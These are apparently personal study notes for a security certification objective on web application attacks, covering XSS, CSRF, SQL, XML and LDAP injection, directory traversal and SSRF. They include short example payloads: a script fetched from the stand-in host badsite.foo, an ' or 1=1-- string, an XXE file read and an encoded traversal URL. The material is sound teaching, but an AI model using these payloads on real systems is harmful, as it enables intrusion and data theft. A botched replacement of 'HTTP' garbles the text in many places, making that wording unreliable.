# EXAM OBJECTIVES COVERED

1.3 Given a scenario, analyze potential Indicators  associated with application attacks
#attack , #threat, #vulnerability 
A web application exposes many interfaces to public networks. Attackers can exploit [[vulnerability|vulnerabilities]] in server software and in client browser security to perform injection and session hijacking attacks that compromise data confidentiality and integrity. Understanding how the vectors and [[vulnerability|vulnerabilities]] can be exploited by these attacks will help you to identify and remediate configuration weaknesses in your systems.
# UNIFORM RESOURCE LOCATOR ANALYSIS

As well as pointing to the host or service location on the Internet (by domain name or IP address), a uniform resource locator ([[URL]]) can **encode** some action or **data to** submit to the **server host**. This is a common vector for malicious activity. 

![](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/8743-1599771808926.png)

Uniform resource locator (URL) analysis.

### Hyper Text Transfer Protocol Methods

As part of URL analysis, it is important to understand how Hyper Text Transfer Protocol operates. An HTTPs session starts with a client (a user-agent, such as a web browser) making a request to an Hyper Text Transfer Protocol server. The connection establishes a TCP connection. This TCP connection can be used for multiple requests, or a client can start new TCP connections for different requests. A request typically comprises a method, a resource (such as a URL path), version number, headers, and body. The principal method is **GET**, used to retrieve a resource. Other methods include:

-   **POST**—send data to the server for processing by the requested resource.
-   **PUT**—create or replace the resource.
-   **DELETE**—can be used to remove the resource.
-   **HEAD**—retrieve the headers for a resource only (not the body).

Data can be submitted to a server either by using a POST or PUT method and the Hyper Text Transfer Protocol headers and body, or by encoding the data within the URL used to access the resource. Data submitted via a URL is delimited by the **?** character, which follows the resource path. Query parameters are usually formatted as one or more name=value pairs, with **ampersands delimiting each pair**. A URL can also include a fragment or anchor ID, delimited by #. The fragment is not processed by the web server. An anchor ID is intended to refer to a section of a page but can be misused to inject JavaScript.

The server response comprises the version number and a status code and message, plus optional headers, and message body. An HHTP response code is the header value returned by a server when a client requests a URL, such as 200 for "OK" or 404 for "Not Found."

### Percent Encoding

A URL can contain only unreserved and reserved characters from the ASCII set. **Reserved ASCII characters are used as delimiters** within the URL syntax and should only be used unencoded for those purposes. The reserved characters are:

: / ? # [ ] @ ! $ & ' ( ) * + , ; =

There are also unsafe characters, which **cannot be used** in a URL. Control characters, such as null string termination, carriage return, line feed, end of file, and tab, are unsafe. **Percent encoding allows a user-agent to submit any safe or unsafe character (or binary data) to the server within the URL.** Its legitimate uses are to encode reserved characters within the URL when they are not part of the URL syntax and to submit Unicode characters. **Percent** encoding can be misused to obfuscate the nature of a URL (encoding unreserved characters) and submit malicious input. Percent encoding can exploit weaknesses in the way the server application performs decoding. Consequently, URLs that make unexpected or extensive use of percent encoding should be treated carefully. You can use a resource such as W3 Schools ([w3schools.com/tags/ref_urlencode.asp](https://www.w3schools.com/tags/ref_urlencode.asp)) for a complete list of character codes, but it is helpful to know some of the characters most widely used in [[exploits]].

Character

Percent Encoding

null

%00

space

%20

CR (Carriage Return)

%0D

LF (Line Feed)

%0A

+

%2B

%

%25

/

%2F

\

%5C

.

%2E

?

%3F

"

%22

'

%27

<

%3C

>

%3E

&

%26

|

%7C
# APPLICATION PROGRAMMING INTERFACE ATTACKS

Web applications and cloud services implement application program interfaces (APIs) to allow consumers to automate services. An API call might use the following general URL format:

https://webapp.foo/?Action=RunInstance&Id=123&Count=1&InstanceAccessKey= MyInstanceAccessKey&Placement=us-east&MyAuthorizationToken
#httpsDamage
If the API isn't secure, [[threat actor]]s can easily take advantage of it to compromise the services and data stored on the web application. **An API must only be used over an encrypted channel (Hyper Text Transfer ProtocolTTPs]]S)**. API calls over plain Hyper Text Transfer ProtocolTTPs]] are not secure and could easily be impersonated or modified by a third party. Some other common attacks against APIs target the following weaknesses and [[vulnerability|vulnerabilities]]:

-   **Ineffective secrets management**, allowing [[threat actor]]s to discover an API key and perform any action authorized to that key.
-   **Lack of input validation,** allowing the [[threat actor]] to insert arbitrary parameters into API methods and queries. This is often referred to as allowing unsanitized input.
-   **Error messages revealing clues to a potential adversary. For example, an authentication error should not reveal whether a valid username has been rejected because of an invalid password. The error should simply indicate an authentication failure.**
-   Denial of service (DoS) by bombarding the API with spurious calls. Protection against this attack can be provided through throttling/rate-limiting mechanisms.
# [[REPLAY ATTACKS]] 

Session management enables web applications to uniquely identify a user across a number of different actions and requests. Session management is particularly important when it comes to user authentication, as it is required to ensure the integrity of the account and the confidentiality of data associated with it. **Session management** is often vulnerable to different kinds of replay attack. To establish a session, the server normally gives the client some type of token. **A replay [[attack]] works by sniffing or guessing the token value and then submitting it to re-establish the session illegitimately.**

Hyper Text Transfer Protocol is nominally a [[stateless protocol]], meaning that the server preserves no information about the client, but mechanisms such as cookies have been developed to preserve stateful data. A cookie is created when the server sends an Hyper Text Transfer Protocol response header with the cookie data. **A cookie has a name and value, plus optional security and expiry attributes**. Subsequent request headers sent by the client will usually include the cookie. Cookies are either nonpersistent (session) cookies, in which case they are stored in memory and deleted when the browser instance is closed, or persistent, in which case they are stored in the browser cache until deleted by the user or pass a defined expiration date.

If cookies are used to store confidential information, the web application should encrypt them before sending them to the client. If using [[My linked notes/TLS]], information in a cookie would be secure in transit but reside on the client computer in plaintext, unless it had been separately encrypted. The value can be any URL-safe encoded string in whatever format and structure the application uses for parsing.

![The Firefox browser with Google's home page loaded and the Inspector pane opened to the Storage tab showing cookies named 1P_JAR, ANID, CONSENT, and NID.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/8901-1599771809090.png)

Viewing cookies set by Google's home page using the Firefox browser's Inspector tools. These cookies are not used for authentication, but they do track whether the user has visited the site before. The CONSENT cookie tracks whether the user has agreed to the terms and conditions of use.

Play Video
# SESSION HIJACKING AND CROSS-SITE REQUEST FORGERY

In the context of a **web application, session hijacking** most often means **replaying a cookie** in some way. Attackers can sniff network traffic to obtain session cookies sent over an unsecured network, **like a public Wi-Fi hotspot**. To counter cookie hijacking, you can encrypt cookies during transmission, delete cookies from the client's browser cache when the client terminates the session, and design your web app to deliver a new cookie with each new session between the app and the client's browser.

Session prediction attacks focus on identifying possible weaknesses in the generation of session tokens that will enable an attacker to predict future valid session values. If an attacker can predict the session token, then the attacker can take over a session that has yet to be established. A session token must be generated using a non-predictable algorithm, and it must not reveal any information about the session client. In addition, proper session management dictates that apps limit the lifespan of a session and require reauthentication after a certain period.

### Cross-Site Request Forgery

A client-side or cross-site request forgery  ([[CSRF or XSRF]]) can [[exploit]] applications that <mark style="background: #FF5582A6;">use cookies to authenticate users and track sessions</mark> . To work, the attacker must convince the victim to start a session with the target site. The attacker must then pass an Hyper Text Transfer ProtocolTTPs]] request to the victim's browser that spoofs an action on the target site, such as changing a password or an email address. This request could be disguised in a few ways and so could be accomplished without the victim necessarily having to click a link. If the target site assumes that the browser is authenticated because there is a valid session cookie and doesn't complete any additional authorization process on the attacker's input (or if the attacker is able to spoof the authorization), it will accept the input as genuine. This is also referred to as a confused deputy attack (the point being that the user and the user's browser are not necessarily the same thing).

Cross-site request forgery example. (Images © 123RF.com.)

### Clickjacking

Clickjacking is an attack where what the user sees and trusts as a web application with some sort of login page or form contains a **malicious** **layer** or invisible iFrame (a web page embedded inside another web page) that allows an attacker to intercept or redirect user input. Clickjacking can be launched using any type of compromise that allows the **adversary to run arbitrary code as a script.** Clickjacking can be mitigated by using Hyper Text Transfer ProtocolTTPs]] response headers that instruct the browser not to open frames from different origins (domains) and by ensuring that any buttons or input boxes on a page are positioned on the top-most layer.

### SSL Strip

A Secure Sockets Layer ([[SSL]]) strip attack is launched against clients on a local network as they try to make connections to websites. The [[threat actor]] must first perform a Man-in-the-Middle ([[MITM]]) attack via [[ARP]] poisoning to masquerade as the default gateway. When a client requests an Hyper Text Transfer ProtocolTTPs]] site that redirects to an Hyper Text Transfer ProtocolTTPs]]S site in an unsafe way, the sslstrip utility ([https://github.com/moxie0/sslstrip](https://github.com/moxie0/sslstrip)) proxies the request and response, serving the client the Hyper Text Transfer ProtocolTTPs]] site, hopefully with an unencrypted login form. If the user enters credentials, they will be captured by the [[threat actor]]. Sites can use the Hyper Text Transfer ProtocolTTPs]] Strict Transport Security (HSTS) lists maintained by browsers to prevent clients requesting Hyper Text Transfer ProtocolTTPs]] in the first place. 

Play Video
# CROSS-SITE SCRIPTING 

Web applications depend on scripting, and most websites these days are web applications rather than static web pages. If the user attempts to disable scripting, very few sites will be left available. A cross-site scripting ([[XSS]]) attack exploits the fact that the browser is likely to trust scripts that appear to come from a site the user has chosen to visit. XSS inserts a malicious script that appears to be part of the trusted site. A nonpersistent type of XSS attack would proceed as follows:

1.  The attacker identifies an input validation vulnerability in the trusted site.
2.  The attacker crafts a URL to perform a code injection against the trusted site. This could be coded in a link from the attacker's site to the trusted site or a link in an email message.
3.  When the user clicks the link, the trusted site returns a page containing the malicious code injected by the attacker. **As the browser is likely to be configured to allow the site to run scripts,** the malicious code will execute.

The malicious code could be **used to** deface the trusted site (by adding any sort of arbitrary HTML code), steal data from the user's cookies, try to intercept information entered into a form, perform a request forgery attack, or try to install malware. The crucial point is that the malicious code runs in the client's browser with the same permission level as the trusted site.

An attack where the malicious input comes from a crafted link is a reflected or nonpersistent XSS attack. A stored/persistent XSS attack aims to insert code into a back-end database or content management system used by the trusted site. For example, the attacker may submit a post to a bulletin board with a malicious script embedded in the message. When other users view the message, the malicious script is executed. For example, with no input sanitization, a [[threat actor]] could type the following into a new post text field:

Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.

Users viewing the post will have the malicious script hook.js execute in their browser.

A third type of [[XSS]] attack exploits [[vulnerability|vulnerabilities]] in client-side scripts. Such scripts often use the Document Object Model ([[DOM]]) to modify the content and layout of a web page. For example, the "document.write" method enables a page to take some user input and modify the page accordingly. An exploit against a client-side script could work as follows:

1.  The attacker identifies an input validation vulnerability in the trusted site. For example, a message board might take the user's name from an input text box and show it in a header.
    
    https://trusted.foo/messages?user=james
    
2.  The attacker crafts a URL to modify the parameters of a script that the server will return, such as:
    
    https://trusted.foo/messages?user=James%3Cscript%20src%3D%22https%3A%2F%2Fbadsite.foo%2Fhook.js%22%3E%3C%2Fscript%3E
    
3.  The server returns a page with the legitimate DOM script embedded, but containing the parameter:
    
    James<script src="https://badsite.foo/hook.js"></script>
    
4.  The browser renders the page using the DOM script, adding the text "James" to the header, but also executing the hook.js script at the same time.
# STRUCTURED QUERY LANGUAGE INJECTION ATTACKS

Attacks such as session replay, CSRF, and [[DOM]]-based [[XSS]] are [[client-side]] [[attack]]s. This means that they execute arbitrary code on the browser. A server-side attack causes the server to do some processing or run a script or query in a way that is not authorized by the application design. Most server-side attacks depend on some kind of injection attack.

**Where an overflow attack works against the way a process performs memory management**, an **injection attack exploits some unsecure way in which the application processes requests and queries**. For example, an application might allow a user to view his or her profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a [[threat actor]] to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.

A web application is likely to use Structured Query Language ([[SQL]]) to read and write information from a database. The main database operations are performed by SQL statements for selecting data (SELECT), inserting data (INSERT), deleting data (DELETE), and updating data (UPDATE). In a SQL injection attack, the [[threat actor]] modifies one or more of these four basic functions by adding code to some input accepted by the app, causing it to execute the attacker's own set of SQL queries or parameters. If successful, this could allow the attacker to extract or insert information into the database or execute arbitrary code on the remote system using the same privileges as the database application ([owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)).

For example, consider a web form that is supposed to take a name as input. If the user enters "Bob", the application runs the following query:

SELECT * FROM tbl_user WHERE username = 'Bob'

If a [[threat actor]] enters the string **' or 1=1--** and this input is not sanitized, the following malicious query will be executed:

SELECT * FROM tbl_user WHERE username = '' or 1=1--'

The logical statement 1=1 is always true, and the -- string turns the rest of the statement into a comment, making it more likely that the web application will parse this modified version and dump a list of all users.
# XML AND LDAP INJECTION ATTACKS

An injection attack can target other types of protocols where the application takes user input to construct a query, filter, or document.

### Extensible Markup Language (XML) Injection

Extensible Markup Language ([[XML]]) is used by apps for authentication and authorizations, and for other types of data exchange and uploading. Data submitted via XML with no encryption or input validation is vulnerable to spoofing, request forgery, and injection of arbitrary data or code. For example, an XML External Entity (XXE) attack embeds a request for a local resource ([owasp.org/www-community/[[vulnerability|vulnerabilities]]/XML_External_Entity_(XXE)_Processing](https://owasp.org/www-community/[[vulnerability|vulnerabilities]]/XML_External_Entity_(XXE)_Processing)).

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM "file:///etc/config"> ]>

<bar>&bar;</bar>

This defines an entity named bar that refers to a local file path. A successful attack will return the contents of /etc/config as part of the response.

### Lightweight Directory Access Protocol (LDAP) Injection

The Lightweight Directory Access Protocol ([[LDAP]]) is another example of a query language. LDAP is specifically used to read and write [[network directory]] databases. A [[threat actor]] could exploit either unauthenticated access or a vulnerability in a client app to submit arbitrary LDAP queries. This could allow accounts to be created or deleted, or for the attacker to change authorizations and privileges ([owasp.org/www-community/attacks/LDAP_Injection](https://owasp.org/www-community/attacks/LDAP_Injection)).

LDAP filters are constructed from (name=value) attribute pairs delimited by parentheses and the logical operators AND (&) and OR (|). Adding filter parameters as unsanitized input can bypass access controls. For example, if a web form authenticates to an LDAP directory with the valid credentials Bob and Pa$$w0rd, it may construct a query such as this from the user input:

(&(username=Bob)(password=Pa$$w0rd))

Both parameters must be true for the login to be accepted. If the form input is not sanitized, a [[threat actor]] could bypass the password check by entering a valid username plus an LDAP filter string, such as **Bob)(&))**. This causes the password filter to be dropped for a condition that is always true:

(&(username=Bob)(&))
# DIRECTORY TRAVERSAL AND COMMAND INJECTION ATTACKS 

**Directory traversal** is another type of injection attack performed against a web server. The [[threat actor]] submits a request for a file outside the web server's root directory by submitting a path to navigate to the parent directory (../). This attack can succeed if the input is not filtered properly and access permissions on the file are the same as those on the web server directory.

The [[threat actor]] might use a canonicalization attack to disguise the nature of the malicious input. [[Canonicalization]] refers to the way the server converts between the different methods by which a resource (such as a file path or URL) may be represented and submitted to the simplest (or canonical) method used by the server to process the input. Examples of encoding schemes include HTML entities and character set percent encoding (ASCII and Unicode). An attacker might be able to exploit [[vulnerability|vulnerabilities]] in the canonicalization process to perform code injection or facilitate directory traversal. For example, to perform a directory traversal attack, the attacker might submit a URL such as:

http://victim.foo/?show=../../../../etc/config

A limited input validation routine would prevent the use of the string ../ and refuse the request. If the attacker submitted the URL using the encoded version of the characters, he or she might be able to circumvent the validation routine:

http://victim.foo/?show=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/config

A **command injection** attack attempts to cause the server to run OS shell commands and return the output to the browser. As with directory traversal, the web server should normally be able to prevent commands from operating outside of the server's directory root and to prevent commands from running with any other privilege level than the web "guest" user (who is normally granted only very restricted privileges). A successful command injection attack would find some way of circumventing this security (or find a web server that is not properly configured).
# SERVER-SIDE REQUEST FORGERY

A server-side request forgery ([[SSRF]]) causes the server application to process an arbitrary request that targets another service, either on the same host or a different one ([owasp.org/www-community/attacks/Server_Side_Request_Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)). SSRF exploits both the lack of authentication between the internal servers and services (implicit trust) and weak input validation, allowing the attacker to submit unsanitized requests or API parameters.

A web application takes API input via a URL or as data encoded in Hyper Text Transfer ProtocolTTPs]] response headers. The web application is likely to use a standard library to read (parse) the URL or response headers. Many [[SSRF]] attacks depend on exploits against specific parsing mechanisms in standard libraries for web servers, such as Apache or IIS, and web application programming languages and tools, such as the curl library, Java, and PHP. SSRF can also use XML injection to exploit weaknesses in XML document parsing.

One type of SSRF uses Hyper Text Transfer Protocol TTPs request splitting or [[CRLF]] injection. The attacker crafts a malicious URL or request header targeting the server's API. The request contains extra line feeds, which may be coded in some non-obvious way. Unless the web server strips these out when processing the URL, it will be tricked into performing a second Hyper Text Transfer Protocol [[HTTP]]  request.

SSRF attacks are often targeted against cloud infrastructure where the web server is only the public-facing component of a deeper processing chain. A typical web application comprises multiple layers of servers, with a client interface, middleware logic layers, and a database layer. Requests initiated from the client interface (a web form) are likely to require multiple requests and responses between the middleware and back-end servers. These will be implemented as Hyper Text Transfer Protocol [[HTTP]] header requests and responses between each server's API. SSRF is a means of accessing these internal servers by causing the public server to execute requests on them. While with CSRF an exploit only has the privileges of the client, with SSRF the manipulated **request is made with the server's privilege level.**

Server-side request forgery example. (Images © 123RF.com.)

[[SSRF]] encompasses a very wide range of potential exploits and targets, some of which include:

-   **[[reconnaissance]]**—a response may contain metadata describing the type and configuration of internal servers. SSRF can also be used to port scan within the internal network.
-   **Credential stealing**—a response may contain an API key that the internal servers use between themselves.
-   **Unauthorized requests**—the server-initiated request might change data or access a service in an unauthorized way.
-   **Protocol smuggling**—despite initially being carried over Hyper Text Transfer ProtocolTTPs]], the SSRF might target an internal [[SMTP]] or [[FTP]] server. That server may be configured in a "best effort" way, strip the Hyper Text Transfer ProtocolTTPs]] header, and do its best to return the response to the SMTP or FTP request.
